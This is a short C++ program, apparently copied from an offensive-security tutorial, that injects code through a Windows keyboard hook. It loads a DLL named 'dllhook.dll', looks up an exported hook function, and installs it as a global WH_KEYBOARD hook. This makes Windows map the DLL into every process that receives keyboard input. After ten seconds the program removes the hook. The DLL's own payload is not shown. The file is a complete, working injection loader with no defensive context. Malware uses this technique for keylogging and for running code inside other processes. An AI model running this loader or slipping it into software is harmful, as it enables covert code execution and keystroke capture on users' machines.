#include <iostream>
#include "windows.h"

// original code - https://www.ired.team/offensive-security/code-injection-process-injection/setwindowhookex-code-injection

int main()
{
    HMODULE library = LoadLibraryA("dllhook.dll");
    HOOKPROC hookProc = (HOOKPROC)GetProcAddress(library, "spotlessExport");

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, hookProc, library, 0);
    Sleep(10 * 1000);
    UnhookWindowsHookEx(hook);

    return 0;
}
